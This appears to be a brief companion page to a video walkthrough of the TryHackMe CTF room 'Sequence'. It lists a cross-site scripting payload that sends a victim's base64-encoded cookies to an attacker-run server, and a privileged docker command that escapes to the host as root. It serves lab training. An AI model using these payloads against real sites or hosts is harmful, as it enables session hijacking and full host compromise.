## TryHackMe room Sequence https://tryhackme.com/room/sequence

### TryHackMe Sequence YouTube Video Walk Through: 

[TryHackMe Sequence - Full Walkthrough 2025](https://youtu.be/looyfVGX_yU)

**Below commands used on TryHackMe room Sequence YouTube video walk through:**

### Stealing mod cookie and send it to python server
```
<img src=x onerror="fetch('http://10.10.143.146:8000/?ce='+btoa(document.cookie))">
```
### root docker escape:

```
docker ps
docker run -v /:/host --privileged -it phpvulnerable chroot /host
```
